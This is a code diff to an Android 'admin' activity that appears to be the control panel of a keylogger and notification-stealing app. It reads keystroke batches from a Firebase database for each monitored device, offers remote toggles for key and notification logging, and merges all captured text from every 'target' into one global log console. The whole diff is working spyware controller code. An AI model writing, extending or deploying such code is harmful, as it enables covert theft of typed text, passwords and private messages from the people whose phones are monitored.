@@ -19,14 +19,14 @@ import com.google.firebase.database.ValueEventListener
 class AdminMainActivity : AppCompatActivity() {
 
     private lateinit var recyclerView: RecyclerView
+    private lateinit var txtGlobalLogConsole: TextView
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
 
     data class DeviceModel(
         val name: String,
         var keylogging: Boolean = true,
-        var notifications: Boolean = true,
-        var logFeed: String = "Connecting..."
+        var notifications: Boolean = true
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -38,6 +38,7 @@ class AdminMainActivity : AppCompatActivity() {
         }
         setContentView(R.layout.activity_admin_main)
 
+        txtGlobalLogConsole = findViewById(R.id.txtGlobalLogConsole)
         recyclerView = findViewById(R.id.recyclerViewDevices)
         recyclerView.layoutManager = LinearLayoutManager(this)
         adapter = DeviceAdapter(deviceList) { device, type, newState ->
@@ -56,6 +57,7 @@ class AdminMainActivity : AppCompatActivity() {
         recyclerView.adapter = adapter
 
         loadConnectedDevices()
+        loadGlobalLogs()
     }
 
     private fun loadConnectedDevices() {
@@ -68,7 +70,6 @@ class AdminMainActivity : AppCompatActivity() {
                         val device = DeviceModel(deviceName)
                         deviceList.add(device)
                         listenToDeviceState(deviceName)
-                        listenToDeviceLogs(deviceName)
                     }
                 }
                 adapter.notifyDataSetChanged()
@@ -99,29 +100,28 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
-    private fun listenToDeviceLogs(deviceName: String) {
-        val logRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches").child(deviceName)
+    private fun loadGlobalLogs() {
+        val logRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches")
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val sb = StringBuilder()
-                for (appChild in snapshot.children) {
-                    val appName = appChild.key ?: continue
-                    for (entry in appChild.children) {
-                        val text = entry.child("text").getValue(String::class.java)
-                            ?: entry.child("title").getValue(String::class.java)
-                            ?: entry.child("typedContent").getValue(String::class.java)
-                            ?: continue
+                for (deviceChild in snapshot.children) {
+                    val deviceName = deviceChild.key ?: continue
+                    for (appChild in deviceChild.children) {
+                        val appName = appChild.key ?: continue
+                        for (entry in appChild.children) {
+                            val text = entry.child("text").getValue(String::class.java)
+                                ?: entry.child("title").getValue(String::class.java)
+                                ?: entry.child("typedContent").getValue(String::class.java)
+                                ?: continue
 
-                        if (text.isNotBlank() && text != "null") {
-                            sb.append("[$appName] $text\n")
+                            if (text.isNotBlank() && text != "null") {
+                                sb.append("[$deviceName] ($appName) $text\n")
+                            }
                         }
                     }
                 }
-                val index = deviceList.indexOfFirst { it.name == deviceName }
-                if (index != -1) {
-                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No recent activity."
-                    adapter.notifyItemChanged(index)
-                }
+                txtGlobalLogConsole.text = if (sb.isNotEmpty()) sb.toString() else "No target logs recorded yet."
             }
 
             override fun onCancelled(error: DatabaseError) {}
@@ -137,7 +137,6 @@ class AdminMainActivity : AppCompatActivity() {
             val txtName: TextView = view.findViewById(R.id.txtDeviceName)
             val btnKey: Button = view.findViewById(R.id.btnToggleKeyLog)
             val btnNotif: Button = view.findViewById(R.id.btnToggleNotifLog)
-            val txtLog: TextView = view.findViewById(R.id.txtDeviceLogConsole)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -164,8 +163,6 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.text = "Notif Logger: OFF"
                 holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
             }
-
-            holder.txtLog.text = device.logFeed
 
             holder.btnKey.setOnClickListener {
                 onToggle(device, "key", !device.keylogging)
